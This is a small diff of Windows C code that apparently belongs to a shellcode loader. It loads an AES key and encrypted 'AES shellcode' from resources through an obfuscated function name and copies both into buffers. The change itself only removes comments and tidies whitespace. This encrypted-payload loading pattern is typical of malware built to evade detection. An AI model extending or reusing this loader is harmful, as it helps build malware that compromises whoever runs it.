@@ -45,11 +45,10 @@ int main() {
     DWORD AESCodeLen;
     hshshlloo("AESCODE", &AESCode, &AESCodeLen);  // Load AES shellcode
 
-    // Print the AES key and shellcode for debugging (as hex)
-     unsigned char keykum[AESkeyLen];
+   
+    unsigned char keykum[AESkeyLen];
     unsigned char codu[AESCodeLen];
 
-    // Copy the data into the arrays
     memcpy(keykum, AESkey, AESkeyLen);
     memcpy(codu, AESCode, AESCodeLen);
 
